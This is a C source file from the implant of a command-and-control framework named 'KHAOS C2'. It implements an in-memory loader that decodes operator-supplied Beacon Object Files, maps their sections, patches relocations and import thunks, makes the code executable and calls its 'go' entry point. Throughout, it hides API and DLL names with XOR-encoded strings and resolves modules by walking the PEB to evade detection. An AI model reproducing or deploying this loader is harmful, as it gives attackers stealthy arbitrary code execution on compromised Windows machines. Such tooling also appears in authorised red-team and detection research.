/*
 * Copyright (c) 2026
 * KHAOS C2 - khaos.khaotic.fr 
 * 
 */

#include "bof.h"
#include "commands.h"
#include "crypto.h"
#include "adv_lazy.h"
#include "evs_strings.h"
#include "peb_walk.h"
#include <windows.h>
#include <excpt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

/* NtProtectVirtualMemory wrapper */
typedef NTSTATUS(NTAPI *_bNtPVM_t)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
static BOOL _vp(LPVOID addr, SIZE_T sz, DWORD prot, DWORD *old)
{
    static _bNtPVM_t fn = NULL;
    if (!fn)
    {
        char fs[24], ns[12];
        volatile unsigned char k = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_NtProtectVirtualMemory); i++)
            fs[i] = (char)(EVS_fn_NtProtectVirtualMemory[i] ^ k);
        fs[sizeof(EVS_fn_NtProtectVirtualMemory)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_ntdll); i++)
            ns[i] = (char)(EVS_dll_ntdll[i] ^ k);
        ns[sizeof(EVS_dll_ntdll)] = '\0';
        HMODULE m = _peb_module(ns);
        SecureZeroMemory(ns, sizeof(ns));
        if (m)
            fn = (_bNtPVM_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    if (!fn)
        return FALSE;
    PVOID base = addr;
    SIZE_T rsz = sz;
    ULONG _old = 0;
    NTSTATUS st = fn((HANDLE)(LONG_PTR)-1, &base, &rsz, (ULONG)prot, &_old);
    if (old)
        *old = (DWORD)_old;
    return st == 0;
}

/* COFF structures */
#pragma pack(push, 1)
typedef struct
{
    WORD Machine;
    WORD NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD SizeOfOptionalHeader;
    WORD Characteristics;
} coff_hdr_t;

typedef struct
{
    char Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLineNumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLineNumbers;
    DWORD Characteristics;
} coff_sec_t;

typedef struct
{
    DWORD VirtualAddress;
    DWORD SymbolTableIndex;
    WORD Type;
} coff_reloc_t;

typedef struct
{
    union
    {
        char Short[8];
        struct
        {
            DWORD Zeros;
            DWORD Offset;
        } Long;
    } Name;
    DWORD Value;
    SHORT SectionNumber;
    WORD Type;
    BYTE StorageClass;
    BYTE NumberOfAuxSymbols;
} coff_sym_t;
#pragma pack(pop)

#define IMAGE_FILE_MACHINE_AMD64 0x8664
#define IMAGE_SCN_MEM_EXECUTE 0x20000000
#define IMAGE_SCN_CNT_UNINIT_DATA 0x00000080
#define IMAGE_REL_AMD64_ADDR64 0x0001
#define IMAGE_REL_AMD64_ADDR32 0x0002
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#define IMAGE_REL_AMD64_REL32 0x0004
#define IMAGE_REL_AMD64_REL32_1 0x0005
#define IMAGE_REL_AMD64_REL32_2 0x0006
#define IMAGE_REL_AMD64_REL32_3 0x0007
#define IMAGE_REL_AMD64_REL32_4 0x0008
#define IMAGE_REL_AMD64_REL32_5 0x0009

typedef struct
{
    char *orig;
    char *buf;
    int len;
    int sz;
} datap;

static char *g_out = NULL;
static size_t g_out_sz = 0;
static size_t g_out_off = 0;

static void _append(const char *s, size_t n)
{
    if (!g_out)
        return;
    size_t av = g_out_sz - g_out_off - 1;
    if (n > av)
        n = av;
    memcpy(g_out + g_out_off, s, n);
    g_out_off += n;
    g_out[g_out_off] = '\0';
}

static void __cdecl _bp_printf(int t, const char *fmt, ...)
{
    (void)t;
    char tmp[8192];
    va_list va;
    va_start(va, fmt);
    int n = vsnprintf(tmp, sizeof(tmp) - 1, fmt, va);
    va_end(va);
    if (n > 0)
        _append(tmp, (size_t)n);
}

static void __cdecl _bp_output(int t, const char *data, int len)
{
    (void)t;
    if (len > 0)
        _append(data, (size_t)len);
}

static int __cdecl _bp_is_admin(void)
{
    HANDLE tok;
    TOKEN_ELEVATION e = {0};
    DWORD rl;
    if (!adv_get()->OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok))
        return 0;
    GetTokenInformation(tok, TokenElevation, &e, sizeof(e), &rl);
    CloseHandle(tok);
    return (int)e.TokenIsElevated;
}

static void __cdecl _bp_data_parse(datap *p, char *buf, int sz)
{
    if (p)
    {
        p->orig = buf;
        p->buf = buf;
        p->len = sz;
        p->sz = sz;
    }
}

static char *__cdecl _bp_data_extract(datap *p, int *out_len)
{
    if (!p || p->len < 4)
        return NULL;
    int n = *(int *)p->buf;
    p->buf += 4;
    p->len -= 4;
    if (n > p->len)
        n = p->len;
    char *r = p->buf;
    p->buf += n;
    p->len -= n;
    if (out_len)
        *out_len = n;
    return r;
}

static int __cdecl _bp_data_int(datap *p)
{
    if (!p || p->len < 4)
        return 0;
    int v = *(int *)p->buf;
    p->buf += 4;
    p->len -= 4;
    return v;
}
static short __cdecl _bp_data_short(datap *p)
{
    if (!p || p->len < 2)
        return 0;
    short v = *(short *)p->buf;
    p->buf += 2;
    p->len -= 2;
    return v;
}
static int __cdecl _bp_data_len(datap *p) { return p ? p->len : 0; }

typedef struct
{
    const unsigned char *enc;
    size_t n;
    void *ptr;
} api_entry_t;

static const api_entry_t k_api[] = {
    {EVS_str_BeaconPrintf, sizeof(EVS_str_BeaconPrintf), (void *)_bp_printf},
    {EVS_str_BeaconOutput, sizeof(EVS_str_BeaconOutput), (void *)_bp_output},
    {EVS_str_BeaconIsAdmin, sizeof(EVS_str_BeaconIsAdmin), (void *)_bp_is_admin},
    {EVS_str_BeaconDataParse, sizeof(EVS_str_BeaconDataParse), (void *)_bp_data_parse},
    {EVS_str_BeaconDataExtract, sizeof(EVS_str_BeaconDataExtract), (void *)_bp_data_extract},
    {EVS_str_BeaconDataInt, sizeof(EVS_str_BeaconDataInt), (void *)_bp_data_int},
    {EVS_str_BeaconDataShort, sizeof(EVS_str_BeaconDataShort), (void *)_bp_data_short},
    {EVS_str_BeaconDataLength, sizeof(EVS_str_BeaconDataLength), (void *)_bp_data_len},
    {NULL, 0, NULL}};

static void _sym_name(const coff_sym_t *sym, const char *strtab, char *out, size_t outsz)
{
    if (sym->Name.Long.Zeros == 0)
        strncpy(out, strtab + sym->Name.Long.Offset, outsz - 1);
    else
    {
        size_t n = strnlen(sym->Name.Short, 8);
        if (n >= outsz)
            n = outsz - 1;
        memcpy(out, sym->Name.Short, n);
        out[n] = '\0';
    }
}

static void *_resolve_win32(const char *fn, const char *dll_hint)
{
    for (int i = 0; k_api[i].enc; i++)
    {
        char name[20];
        volatile unsigned char _k = EVS_KEY;
        for (size_t j = 0; j < k_api[i].n; j++)
            name[j] = (char)(k_api[i].enc[j] ^ _k);
        name[k_api[i].n] = '\0';
        int match = (strcmp(fn, name) == 0);
        SecureZeroMemory(name, sizeof(name));
        if (match)
            return k_api[i].ptr;
    }

    HMODULE hm = NULL;
    if (dll_hint && dll_hint[0])
    {
        hm = _peb_module(dll_hint);
        if (!hm)
            hm = LoadLibraryA(dll_hint);
    }
    else
    {
        static const char *tries[] = {
            "kernel32.dll", "ntdll.dll", "advapi32.dll",
            "user32.dll", "ws2_32.dll", "ole32.dll", "shell32.dll", NULL};
        for (int i = 0; tries[i]; i++)
        {
            hm = _peb_module(tries[i]);
            if (hm && GetProcAddress(hm, fn))
                break;
            hm = NULL;
        }
    }
    return hm ? (void *)GetProcAddress(hm, fn) : NULL;
}

static int _parse_sym(const char *name, char *dll, size_t dll_sz,
                      char *fn, size_t fn_sz)
{
    int is_imp = (strncmp(name, "__imp_", 6) == 0);
    const char *p = is_imp ? name + 6 : name;

    /* check for Beacon* prefix */
    {
        volatile unsigned char _k = EVS_KEY;
        if (strlen(p) >= sizeof(EVS_str_Beacon) &&
            (unsigned char)p[0] == (unsigned char)(EVS_str_Beacon[0] ^ _k) &&
            (unsigned char)p[1] == (unsigned char)(EVS_str_Beacon[1] ^ _k) &&
            (unsigned char)p[2] == (unsigned char)(EVS_str_Beacon[2] ^ _k) &&
            (unsigned char)p[3] == (unsigned char)(EVS_str_Beacon[3] ^ _k) &&
            (unsigned char)p[4] == (unsigned char)(EVS_str_Beacon[4] ^ _k) &&
            (unsigned char)p[5] == (unsigned char)(EVS_str_Beacon[5] ^ _k))
        {
            strncpy(fn, p, fn_sz - 1);
            dll[0] = '\0';
            return is_imp;
        }
    }

    const char *d = strchr(p, '$');
    if (d)
    {
        size_t dl = (size_t)(d - p);
        if (dl >= dll_sz - 5)
            dl = dll_sz - 6;
        memcpy(dll, p, dl);
        dll[dl] = '\0';
        /* lowercase and append .dll if missing */
        for (size_t i = 0; i < dl; i++)
            dll[i] = (char)tolower((unsigned char)dll[i]);
        if (!strstr(dll, "."))
            strncat(dll, ".dll", dll_sz - strlen(dll) - 1);
        strncpy(fn, d + 1, fn_sz - 1);
    }
    else
    {
        dll[0] = '\0';
        strncpy(fn, p, fn_sz - 1);
    }
    return is_imp;
}

#define THUNK_PTR_SZ 8  /* function pointer */
#define THUNK_JMP_SZ 14 /* FF 25 00 00 00 00 + 8-byte addr */

typedef struct
{
    BYTE *ptr; /* RW: 8-byte fn pointer */
    BYTE *jmp; /* RX: 14-byte jmp trampoline */
} thunk_pair_t;

static BYTE *g_thunk_block = NULL;
static DWORD g_thunk_count = 0;

static int _build_thunks(const coff_hdr_t *hdr, const coff_sym_t *symtab,
                         const char *strtab, thunk_pair_t *pairs)
{
    DWORD ext = 0;
    for (DWORD si = 0; si < hdr->NumberOfSymbols;
         si += 1 + symtab[si].NumberOfAuxSymbols)
    {
        const coff_sym_t *sym = symtab + si;
        if (sym->SectionNumber == 0 && sym->StorageClass == 2)
            ext++;
    }
    if (!ext)
        return 1;
    g_thunk_count = ext;

    DWORD ptr_block = ext * THUNK_PTR_SZ;
    DWORD jmp_block = ext * THUNK_JMP_SZ;
    DWORD total = ptr_block + jmp_block + 64; /* tiny padding */

    g_thunk_block = (BYTE *)VirtualAlloc(NULL, total,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_thunk_block)
        return 0;

    BYTE *ptr_base = g_thunk_block;
    BYTE *jmp_base = g_thunk_block + ptr_block;

    DWORD idx = 0;
    for (DWORD si = 0; si < hdr->NumberOfSymbols;
         si += 1 + symtab[si].NumberOfAuxSymbols)
    {
        const coff_sym_t *sym = symtab + si;
        if (sym->SectionNumber != 0 || sym->StorageClass != 2)
            continue;

        char sname[512] = {0};
        _sym_name(sym, strtab, sname, sizeof(sname));

        char dll[64] = {0}, fn[256] = {0};
        _parse_sym(sname, dll, sizeof(dll), fn, sizeof(fn));

        void *target = _resolve_win32(fn, dll[0] ? dll : NULL);

        BYTE *pt = ptr_base + idx * THUNK_PTR_SZ;
        *(void **)pt = target;

        BYTE *jt = jmp_base + idx * THUNK_JMP_SZ;
        jt[0] = 0xFF;
        jt[1] = 0x25;
        jt[2] = 0;
        jt[3] = 0;
        jt[4] = 0;
        jt[5] = 0;
        *(void **)(jt + 6) = target;

        pairs[si] = (thunk_pair_t){pt, jt};
        idx++;
    }

    DWORD old;
    _vp(jmp_base, jmp_block, PAGE_EXECUTE_READ, &old);
    return 1;
}

int cmd_bof(const char *coff_b64, const char *args_b64,
            char *output_buf, size_t output_sz)
{
    if (!coff_b64 || !output_buf || !output_sz)
        return -1;
    output_buf[0] = '\0';

    size_t coff_sz = 0;
    uint8_t *coff = base64_decode(coff_b64, &coff_sz);
    if (!coff || coff_sz < sizeof(coff_hdr_t))
    {
        snprintf(output_buf, output_sz, "[bof] b64 decode fail\n");
        if (coff)
            free(coff);
        return -1;
    }

    char *args = NULL;
    int args_len = 0;
    if (args_b64 && args_b64[0])
    {
        size_t alen = 0;
        args = (char *)base64_decode(args_b64, &alen);
        args_len = (int)alen;
    }
    (void)args_len;

    const coff_hdr_t *hdr = (const coff_hdr_t *)coff;
    if (hdr->Machine != IMAGE_FILE_MACHINE_AMD64)
    {
        snprintf(output_buf, output_sz,
                 "[bof] not x64 COFF (machine=0x%04X)\n", hdr->Machine);
        free(coff);
        if (args)
            free(args);
        return -1;
    }

    const coff_sec_t *secs = (const coff_sec_t *)(coff + sizeof(coff_hdr_t));
    const coff_sym_t *symtab = (const coff_sym_t *)(coff + hdr->PointerToSymbolTable);
    const char *strtab = (const char *)(symtab + hdr->NumberOfSymbols);

    WORD nsec = hdr->NumberOfSections;
    BYTE **mapped = (BYTE **)calloc(nsec, sizeof(BYTE *));
    thunk_pair_t *pairs = (thunk_pair_t *)calloc(
        hdr->NumberOfSymbols ? hdr->NumberOfSymbols : 1, sizeof(thunk_pair_t));

    if (!mapped || !pairs)
        goto fail;

    for (WORD i = 0; i < nsec; i++)
    {
        DWORD sz = secs[i].SizeOfRawData;
        DWORD vsz = secs[i].VirtualSize ? secs[i].VirtualSize : sz;
        if (!sz && !vsz)
            continue;
        DWORD alloc_sz = (sz > vsz ? sz : vsz) + 16;

        mapped[i] = (BYTE *)VirtualAlloc(NULL, alloc_sz,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!mapped[i])
        {
            snprintf(output_buf, output_sz, "[bof] alloc fail sec %d\n", i);
            goto fail;
        }

        if (sz && secs[i].PointerToRawData)
            memcpy(mapped[i], coff + secs[i].PointerToRawData, sz);
        /* BSS (uninit data) stays zeroed from VirtualAlloc */
    }

    if (!_build_thunks(hdr, symtab, strtab, pairs))
    {
        snprintf(output_buf, output_sz, "[bof] thunk alloc fail\n");
        goto fail;
    }

    for (WORD i = 0; i < nsec; i++)
    {
        if (!mapped[i] || !secs[i].NumberOfRelocations)
            continue;
        const coff_reloc_t *relocs =
            (const coff_reloc_t *)(coff + secs[i].PointerToRelocations);

        for (WORD ri = 0; ri < secs[i].NumberOfRelocations; ri++)
        {
            DWORD sym_idx = relocs[ri].SymbolTableIndex;
            WORD type = relocs[ri].Type;
            BYTE *site = mapped[i] + relocs[ri].VirtualAddress;

            if (sym_idx >= hdr->NumberOfSymbols)
                continue;
            const coff_sym_t *sym = symtab + sym_idx;

            BYTE *target = NULL;
            int is_ext = (sym->SectionNumber == 0 && sym->StorageClass == 2);

            if (!is_ext && sym->SectionNumber > 0 && sym->SectionNumber <= nsec)
            {
                int si2 = sym->SectionNumber - 1;
                if (mapped[si2])
                    target = mapped[si2] + sym->Value;
            }

            switch (type)
            {
            case IMAGE_REL_AMD64_ADDR64:
                if (is_ext && pairs[sym_idx].ptr)
                    *(DWORD64 *)site = (DWORD64)(uintptr_t)pairs[sym_idx].ptr;
                else if (target)
                    *(DWORD64 *)site += (DWORD64)(uintptr_t)target;
                break;

            case IMAGE_REL_AMD64_ADDR32:
                if (target)
                    *(DWORD *)site += (DWORD)(uintptr_t)target;
                break;

            case IMAGE_REL_AMD64_ADDR32NB:
                if (target)
                    *(DWORD *)site += (DWORD)((uintptr_t)target - (uintptr_t)_peb_self_base());
                break;

            case IMAGE_REL_AMD64_REL32:
            case IMAGE_REL_AMD64_REL32_1:
            case IMAGE_REL_AMD64_REL32_2:
            case IMAGE_REL_AMD64_REL32_3:
            case IMAGE_REL_AMD64_REL32_4:
            case IMAGE_REL_AMD64_REL32_5:
            {
                DWORD addend = type - IMAGE_REL_AMD64_REL32;
                BYTE *dest = NULL;
                if (is_ext)
                {
                    /* for __imp_ use ptr thunk, for direct refs use jmp thunk */
                    char sname[512] = {0};
                    _sym_name(sym, strtab, sname, sizeof(sname));
                    int is_imp = (strncmp(sname, "__imp_", 6) == 0);
                    dest = is_imp ? pairs[sym_idx].ptr : pairs[sym_idx].jmp;
                }
                else
                {
                    dest = target;
                }
                if (dest)
                {
                    // internal section refs carry the section offset as existing site value
                    DWORD sec_addend = is_ext ? 0 : *(DWORD *)site;
                    *(DWORD *)site = (DWORD)((uintptr_t)dest + sec_addend
                                             - ((uintptr_t)site + 4 + addend));
                }
                break;
            }
            default:
                break;
            }
        }
    }

    for (WORD i = 0; i < nsec; i++)
    {
        if (!mapped[i])
            continue;
        if (secs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
        {
            DWORD old;
            DWORD sz = secs[i].SizeOfRawData ? secs[i].SizeOfRawData
                                             : secs[i].VirtualSize;
            _vp(mapped[i], sz + 16, PAGE_EXECUTE_READ, &old);
        }
    }

    typedef void(__cdecl * go_fn_t)(char *, int);
    go_fn_t go_fn = NULL;

    for (DWORD si = 0; si < hdr->NumberOfSymbols && !go_fn;
         si += 1 + symtab[si].NumberOfAuxSymbols)
    {
        const coff_sym_t *sym = symtab + si;
        if (sym->SectionNumber <= 0)
            continue;

        char sname[512] = {0};
        _sym_name(sym, strtab, sname, sizeof(sname));

        if (strcmp(sname, "go") == 0)
        {
            int sec_idx = sym->SectionNumber - 1;
            if (sec_idx < nsec && mapped[sec_idx])
                go_fn = (go_fn_t)(void *)(mapped[sec_idx] + sym->Value);
        }
    }

    if (!go_fn)
    {
        snprintf(output_buf, output_sz, "[bof] 'go' not found\n");
        goto fail;
    }

    g_out = output_buf;
    g_out_sz = output_sz;
    g_out_off = 0;

#ifdef _MSC_VER
    __try
    {
        go_fn(args, args_len);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        size_t av = output_sz - g_out_off - 1;
        if (av > 0)
        {
            char err[64];
            int n = snprintf(err, sizeof(err),
                             "[bof] exception 0x%08lX\n",
                             (unsigned long)GetExceptionCode());
            if (n > 0)
                _append(err, (size_t)n);
        }
    }
#else
    go_fn(args, args_len);
#endif

    g_out = NULL;

fail:
    if (mapped)
    {
        for (WORD i = 0; i < nsec; i++)
            if (mapped[i])
                VirtualFree(mapped[i], 0, MEM_RELEASE);
        free(mapped);
    }
    if (g_thunk_block)
    {
        VirtualFree(g_thunk_block, 0, MEM_RELEASE);
        g_thunk_block = NULL;
        g_thunk_count = 0;
    }
    if (pairs)
        free(pairs);
    if (args)
        free(args);
    if (coff)
        free(coff);
    return 0;
}
